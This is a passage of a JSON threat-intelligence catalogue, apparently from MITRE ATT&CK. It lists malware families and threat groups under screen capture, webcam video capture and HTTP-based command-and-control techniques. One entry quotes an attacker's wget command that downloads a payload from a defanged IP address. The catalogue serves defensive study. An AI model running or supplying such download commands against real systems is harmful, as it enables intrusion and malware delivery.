host."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has the ability to capture screenshots."}, {"id": "S0098", "name": "T9000", "description": "T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot contains screen capture functionality."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can take a desktop screenshot and save the file into \\ProgramData\\Mail\\MailAg\\shot.png."}, {"id": "S0647", "name": "Turian", "description": "Turian has the ability to take screenshots."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of taking screenshots."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT can capture desktop screenshots in the PNG format and send them to the C2 server."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used hooked APIs to take screenshots."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to take screenshots on a compromised host."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN can perform screen captures of the victim\u2019s machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered PowerShell scripts capable of taking screenshots of victim machines."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has the ability to take a screenshot of the infected host desktop using Windows GDI+."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET saves a screen capture of the victim's system with a numbered filename and .jpg extension. Screen captures are taken at specified intervals based on the system. "}, {"id": "S0248", "name": "yty", "description": "yty collects screenshots of the victim machine."}, {"id": "S0251", "name": "Zebrocy", "description": "A variant of Zebrocy captures screenshots of the victim\u2019s machine in JPEG and BMP format."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can take screenshots of the victim\u2019s machine."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has the ability to obtain screenshots of the compromised system."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can capture screenshots."}], "sub_techniques": []}, {"name": "Video Capture", "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.", "detailed_description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.", "id": "T1125", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can access the victim\u2019s webcam and record video."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can record screen content on targeted systems."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has modules that are capable of capturing video from a victim's webcam."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can record screen content in AVI format."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT has a feature to access the webcam on the victim\u2019s machine."}, {"id": "S0591", "name": "ConnectWise", "description": "ConnectWise can record video on remote hosts."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can capture webcam video on targeted systems."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can access the victim\u2019s webcam to take pictures."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of capturing video."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has exfiltrated images from compromised IP cameras."}, {"id": "S0363", "name": "Empire", "description": "Empire can capture webcam data on Windows and macOS systems."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab has the capability to capture video from a victim machine."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a remote webcam monitoring capability."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can remotely activate the victim\u2019s webcam to capture content."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has the capability to capture video from a webcam."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar captures images from the webcam."}, {"id": "S0409", "name": "Machete", "description": "Machete takes photos from the computer\u2019s web camera."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can access the victim's webcam and capture data."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can access the victim's webcam."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can capture images from webcams on compromised hosts."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can capture camera video as part of its collection process."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can access a connected webcam and capture pictures."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can perform webcam viewing."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can access a system\u2019s webcam and take pictures."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has the ability to access the webcam."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to record video on a compromised host."}, {"id": "G0091", "name": "Silence", "description": "Silence has been observed making videos of victims to observe bank employees day to day activities."}, {"id": "S0098", "name": "T9000", "description": "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to capture webcam video."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can access the webcam on a victim's machine."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command to perform video device spying."}], "sub_techniques": []}]}, {"name": "Command and Control", "description": "The adversary is trying to communicate with compromised systems to control them.Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "id": "TA0011", "techniques": [{"name": "Application Layer Protocol", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.", "detailed_description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.", "id": "T1071", "examples": [{"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to use Telnet for communication."}, {"id": "S0038", "name": "Duqu", "description": "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used an IRC channel for C2 communications."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used valid accounts over RDP to connect to targeted systems."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has used IRC for C2."}, {"id": "S0034", "name": "NETEAGLE", "description": "Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses TCP and UDP communication for command and control traffic."}, {"id": "S1084", "name": "QUIETEXIT", "description": "QUIETEXIT can use an inverse negotiated SSH connection as part of its C2."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin is capable of contacting the TOR network for delivering second-stage payloads."}, {"id": "G0106", "name": "Rocke", "description": "Rocke issued wget requests from infected systems to the C2."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape connects to an IRC server for C2."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used an IRC bot for C2 communications."}], "sub_techniques": [{"name": "Web Protocols", "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.", "detailed_description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "id": "T1071.001", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. "}, {"id": "S0066", "name": "3PARA RAT", "description": "3PARA RAT uses HTTP for command and control."}, {"id": "S0065", "name": "4H RAT", "description": "4H RAT uses HTTP for command and control."}, {"id": "S0469", "name": "ABK", "description": "ABK has the ability to use HTTP in communications with C2."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT can use HTTP to communicate with C2 servers."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has used HTTP for C2 communications."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has used HTTP for C2 communications."}, {"id": "S0504", "name": "Anchor", "description": "Anchor has used HTTP and HTTPS in C2 communications."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA has the ability to make GET requests to download files from C2."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has sent data to its C2 server via POST requests."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to communicate with C2 over HTTP."}, {"id": "G0026", "name": "APT18", "description": "APT18 uses HTTP for C2 communications."}, {"id": "G0073", "name": "APT19", "description": "APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2."}, {"id": "G0007", "name": "APT28", "description": "Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used HTTP for command and control."}, {"id": "G0067", "name": "APT37", "description": "APT37 uses HTTPS to conceal C2 communications."}, {"id": "G0082", "name": "APT38", "description": "APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used HTTP in communications with C2."}, {"id": "G0096", "name": "APT41", "description": "APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used HTTPS for command and control."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has used HTTP in C2 communications."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can use HTTP to communicate with its C2 servers."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to use HTTP in communication with C2."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to use HTTPS for C2 communiations."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE uses HTTP as a transport to communicate with its command server."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS establishes a backdoor over HTTP."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch uses HTTP for C2."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot uses HTTP for command and control communication."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to use HTTP in communications with C2."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used HTTP for C2 communications."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used HTTP POST requests for C2."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy communicates with its C2 server over HTTP."}, {"id": "S0564", "name": "BlackMould", "description": "BlackMould can send commands to C2 in the body of HTTP POST requests."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has used HTTPS over port 443 for command and control."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox has used HTTP POST requests for C2."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER malware has used HTTP for C2."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use HTTPS and HTTPS for C2 communication."}, {"id": "S0043", "name": "BUBBLEWRAP", "description": "BUBBLEWRAP can communicate using HTTP or HTTPS."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore uses HTTP requests for C2."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used HTTP for C2 communications."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors used HTTP for some of their C2 communications."}, {"id": "S0030", "name": "Carbanak", "description": "The Carbanak malware communicates to its command server using HTTP with an encrypted payload."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has connected to C2 servers via HTTP."}, {"id": "S0335", "name": "Carbon", "description": "Carbon can use HTTP in C2 communications."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT is downloaded using HTTP over port 443."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used HTTP for C2 communications."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can use HTTP to communicate with C2."}, {"id": "S0144", "name": "ChChes", "description": "ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used HTTPS for C2 communications."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can send HTTP GET requests to  C2."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component executes code sent via HTTP POST commands."}, {"id": "S0023", "name": "CHOPSTICK", "description": "Various implementations of CHOPSTICK communicate with C2 over HTTP."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to communicate over HTTP."}, {"id": "S0054", "name": "CloudDuke", "description": "One variant of CloudDuke uses HTTP and HTTPS for C2."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used HTTPS for C2."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses HTTP for C2 communication."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used HTTP requests for command and control."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used HTTP for C2 communications."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL can communicate over HTTP for C2."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can establish command and control via HTTP."}, {"id": "S0046", "name": "CozyCar", "description": "CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can use HTTPS for C2 using the Microsoft Graph API."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use HTTP for C2."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can use a HTTP GET request to download its final payload."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has conducted C2 communications with a Dropbox account using the HTTP API."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can use GET requests to download additional payloads from C2."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can use the curl API for C2 communications."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can download files via HTTP and HTTPS."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can use HTTPS in C2 communications."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly uses HTTP for command and control communication."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use HTTP in C2 communication."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string \"&&&\"."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can use HTTP for C2 communications."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has used HTTP and HTTPS for C2."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman uses HTTPS for command and control."}, {"id": "S0187", "name": "Daserf", "description": "Daserf uses HTTP for C2."}, {"id": "S0243", "name": "DealersChoice", "description": "DealersChoice uses HTTP for communication with the C2 server."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM can use HTTPS to download files."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has used HTTP GET and POST requests for C2."}, {"id": "S0200", "name": "Dipsind", "description": "Dipsind uses HTTP for C2."}, {"id": "S0600", "name": "Doki", "description": "Doki has communicated with C2 over HTTPS."}, {"id": "S0695", "name": "Donut", "description": "Donut can use HTTP to download previously staged shellcode payloads."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to use HTTP in C2 communications."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper communicates to its C2 server over HTTP."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use HTTP or HTTPS for C2 communications."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has used POST requests and HTTPS for C2 communications."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request."}, {"id": "S0062", "name": "DustySky", "description": "DustySky has used both HTTP and HTTPS for C2."}, {"id": "S0024", "name": "Dyre", "description": "Dyre uses HTTPS for C2 communications."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has communicated with its C2 servers via HTTPS protocol."}, {"id": "S0081", "name": "Elise", "description": "Elise communicates over HTTP or HTTPS for C2."}, {"id": "S0064", "name": "ELMER", "description": "ELMER uses HTTP for command and control."}, {"id": "S0082", "name": "Emissary", "description": "Emissary uses HTTP or HTTPS for C2."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used HTTP for command and control."}, {"id": "S0363", "name": "Empire", "description": "Empire can conduct command and control over protocols like HTTP and HTTPS."}, {"id": "S0091", "name": "Epic", "description": "Epic uses HTTP and HTTPS for C2 communications."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has executed C2 commands directly via HTTP."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux uses HTTPS for C2 communications."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has used HTTP for communication."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can be controlled via a custom C2 protocol over HTTP."}, {"id": "S0171", "name": "Felismus", "description": "Felismus uses HTTP for C2."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT uses HTTP and HTTPS to communicate with the C2 server."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used HTTP POST requests to transmit data."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used HTTPS for command and control."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy uses HTTP for C2."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can communicate with its C2 using HTTP."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has used HTTP for C2."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb has the ability to communicate with C2 servers over HTTP GET/POST requests."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING can retrieve C2 commands from values stored in the DSID cookie from the current HTTP request or from decompressed zlib data within the request's POST data."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used HTTP GET requests for C2."}, {"id": "S1144", "name": "FRP", "description": "FRP has the ability to use HTTP and HTTPS to enable the forwarding of requests for internal services via domain name."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used HTTP and HTTPS for C2 communications."}, {"id": "S0168", "name": "Gazer", "description": "Gazer communicates with its C2 servers over HTTP."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use HTTP/S in C2 communications."}, {"id": "S0049", "name": "GeminiDuke", "description": "GeminiDuke uses HTTP and HTTPS for command and control."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to use HTTP to send information collected from an infected host to C2."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon uses HTTP for communication to the control servers."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication."}, {"id": "S0597", "name": "GoldFinder", "description": "GoldFinder has used HTTP for C2."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has used HTTPS and HTTP GET requests with custom HTTP cookies for C2."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to communicate with its C2 over HTTP."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has the ability to use HTTP in C2 communications."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT uses HTTP for C2."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy uses HTTP and HTTPS for C2 communications."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to use HTTP for C2 communications."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader can use HTTP to retrieve additional binaries."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used open-source C2 frameworks, including Covenant."}, {"id": "S0037", "name": "HAMMERTOSS", "description": "The \"Uploader\" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has used HTTP to communicate with a single hard-coded C2 server."}, {"id": "S0170", "name": "Helminth", "description": "Helminth can use HTTP for C2."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor communicates with its C2 server over HTTPS."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used HTTP and HTTPS to send data back to its C2 server."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has used HTTP for C2."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has used HTTP and HTTPS for command and control."}, {"id": "S0068", "name": "httpclient", "description": "httpclient uses HTTP for command and control."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has used HTTPS for C2 communications."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can use HTTP GET to request and pull information from C2."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used HTTPS in communications with C2."}, {"id": "G0100", "name": "Inception", "description": "Inception has used HTTP, HTTPS, and WebDav in network communications."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer\u2019s main backdoor connected to a remote C2 server using HTTPS."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole uses HTTP for C2 communications."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper connects to command and control servers via HTTP POST requests based on parameters hard-coded into the malware."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe uses HTTP for command and control."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2."}, {"id": "S1020", "name": "Kevin", "description": "Variants of Kevin can communicate with C2 over HTTP."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap uses HTTPS for command and control."}, {"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG has the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can send data to C2 with HTTP POST requests."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky  has used HTTP GET and POST requests for C2."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has communicated with C2 over HTTP."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has used HTTP for C2 communications."}, {"id": "S0162", "name": "Komplex", "description": "The Komplex C2 channel uses HTTP POST requests."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used HTTP POST for C2."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK has used HTTP POST requests to send data to C2."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can send registration information to C2 via HTTP POST."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has conducted C2 over HTTP and HTTPS."}, {"id": "S1119", "name": "LIGHTWIRE", "description": "LIGHTWIRE can use HTTP for C2 communications."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can use HTTP GET requests in C2 communications."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can use HTTP and HTTPS for C2 communications."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used HTTP for C2 communications."}, {"id": "S0582", "name": "LookBack", "description": "LookBack\u2019s C2 proxy tool sends data to a C2 server over HTTP."}, {"id": "S0042", "name": "LOWBALL", "description": "LOWBALL command and control occurs via HTTPS over port 443."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used HTTP for C2."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can use POST to send victim identification to C2 and GET to retrieve commands."}, {"id": "S0409", "name": "Machete", "description": "Machete uses HTTP for Command & Control."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy uses HTTP for command and control."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use HTTP for C2."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used HTTP for C2."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka has used HTTP for command and control communication."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can initiate communication over HTTP/HTTPS for its C2 server."}, {"id": "S0449", "name": "Maze", "description": "Maze has communicated to hard-coded IP addresses via HTTP."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can use HTTPS in communication with C2 web servers."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has the ability to use HTTP in communication with C2."}, {"id": "G1013", "name": "Metador", "description": "Metador has used HTTP for C2."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can use HTTP for C2 communications."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used HTTP for C2."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia uses HTTP and HTTPS for C2 network communications."}, {"id": "S1015", "name": "Milan", "description": "Milan can use HTTPS for communication with C2."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke uses HTTP and HTTPS for command and control."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type network traffic can communicate over HTTP."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can use HTTP for C2 communication."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used curl to connect to adversary-controlled infrastructure and retrieve additional payloads."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs uses HTTPS for C2."}, {"id": "S1047", "name": "Mori", "description": "Mori can communicate using HTTP over IPv4 or IPv6 depending on a flag set."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used HTTP for C2 communications."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has communicated with its C2 via HTTP POST requests."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports HTTP-based C2 profiles."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can use HTTP for C2 communications."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has the ability to communicate over HTTP."}, {"id": "S1106", "name": "NGLite", "description": "NGLite will initially beacon out to the NKN network via an HTTP POST over TCP 30003."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used HTTP for C2."}, {"id": "S1100", "name": "Ninja", 